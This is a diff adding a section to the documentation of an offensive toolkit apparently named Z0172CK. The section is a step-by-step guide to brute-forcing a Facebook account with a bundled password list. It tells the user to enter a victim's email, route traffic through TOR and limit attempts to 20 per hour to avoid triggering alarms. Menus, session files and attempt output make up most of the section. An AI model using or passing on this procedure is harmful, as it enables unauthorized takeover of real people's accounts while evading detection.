@@ -391,3 +391,157 @@ the results are saved in the result folder in the file IpInfo.json
 Results Saved in result/IpInfo.json 
 ```
 
+### Brute Force 
+
+with the brute force option we can attack sites and protocols using passwords
+
+```bash
+
+                                                         c=====e
+                                                            H
+   ____________                                         _,,_H__
+  (__((__((___()                                       //|     |
+ (__((__((___()()_____________________________________// |ERIK |
+(__((__((___()()()------------------------------------'  |_____|
+      Brute Force V0.1
+  
+
+[01] Facebook
+
+[99] Back
+
+ Z0172CK (BruteForce) > 
+```
+
+#### Facebook
+
+{% hint style="warning" %}
+Only 20 passwords are processed per hour to avoid blocking or awakening an alarm in the victim gutter
+{% endhint %}
+
+```bash
+Z0172CK (BruteForce) > 1
+
+[01] Start Brute Force
+[02] Continue Brute Force
+
+[99] Back
+
+ Z0172CK (BruteForce/Facebook) > 
+```
+
+in the facebook part we have two options 1. start a new attack 2. continue with an attack
+
+If we select the first option to start a new attack, it will ask us for an email and a list of passwords
+
+at any time we can give ctrl + c to save our attack and continue later with the second option
+
+{% hint style="info" %}
+if we get an error of this type " Please, check your TOR Connection! Just type" tor "or" service tor start " " just go back to the facebook option
+{% endhint %}
+
+```bash
+Z0172CK (BruteForce/Facebook) > 1
+Email account:
+```
+
+we put the mail of a victim
+
+```bash
+Password List (Hit Enter to default list):
+```
+
+we put the path of the list of our passwords or we give enter to use the one that comes by default
+
+```bash
+Wordlist: modules/FB-BruteForce/passwords.lst (39331)
+[*] Press Ctrl + C to stop or save session
+Trying pass (1/39331): "password"
+Trying pass (2/39331): "12345678"
+Trying pass (3/39331): "123456789"
+Trying pass (4/39331): "iam123"
+Trying pass (5/39331): "baseball"
+Trying pass (6/39331): "football"
+Trying pass (7/39331): "qwertyuiop"
+Trying pass (8/39331): "1234567890"
+Trying pass (9/39331): "superman"
+Trying pass (10/39331): "1qaz2wsx"
+Trying pass (11/39331): "trustno1"
+Trying pass (12/39331): "jennifer"
+Trying pass (13/39331): "sunshine"
+Trying pass (14/39331): "iloveyou"
+Trying pass (15/39331): "starwars"
+Trying pass (16/39331): "computer"
+Trying pass (17/39331): "michelle"
+Trying pass (18/39331): "11111111"
+Trying pass (19/39331): "princess"
+Trying pass (20/39331): "987654321"
+[*] Waiting 1 hour, to return at: 
+```
+
+all 20 passwords have been completed and we have to wait for one or we can give it Ctrl + c to save the attack and use it again in an hour
+
+```bash
+Ctrl + c
+[*] Waiting a second...
+
+Save session for user correo@correo.com ? [Y/n]:
+```
+
+It will ask us if we want to save the session. in this case I give it that if
+
+```bash
+Save session for user correo@correo.com ? [Y/n]: Y
+```
+
+```bash
+Session saved.
+Use [11] resume
+```
+
+after being saved we can use the attack again until it was
+
+```bash
+[01] Start Brute Force
+[02] Continue Brute Force
+
+[99] Back
+
+Z0172CK (BruteForce/Facebook) > 2
+```
+
+```bash
+Z0172CK (BruteForce/Facebook) > 2
+Files sessions:
+1 : modules/FB-BruteForce/sessions/store.session.correo@correo.com.2020-07-23T1133 (wl: modules/FB-BruteForce/passwords.lst, lastpass: 987654321 )
+Choose a session number: 
+```
+
+we give enter and we can continue with our attack
+
+```bash
+1 : modules/FB-BruteForce/sessions/store.session.correo@correo.com.2020-07-23T1133 (wl: modules/FB-BruteForce/passwords.lst, lastpass: 987654321 )
+Choose a session number: 
+[*] Resuming session for user: 
+[*] Wordlist:  modules/FB-BruteForce/passwords.lst
+[*] Press Ctrl + C to stop or save session
+Trying pass (20/39331): 987654321
+Trying pass (21/39331): corvette
+Trying pass (22/39331): 1234qwer
+Trying pass (23/39331): 88888888
+Trying pass (24/39331): q1w2e3r4t5
+Trying pass (25/39331): internet
+Trying pass (26/39331): samantha
+Trying pass (27/39331): whatever
+Trying pass (28/39331): maverick
+Trying pass (29/39331): steelers
+Trying pass (30/39331): mercedes
+Trying pass (31/39331): 123123123
+Trying pass (32/39331): qwer1234
+Trying pass (33/39331): hardcore
+Trying pass (34/39331): q1w2e3r4
+Trying pass (35/39331): midnight
+Trying pass (36/39331): bigdaddy
+Trying pass (37/39331): victoria
+```
+
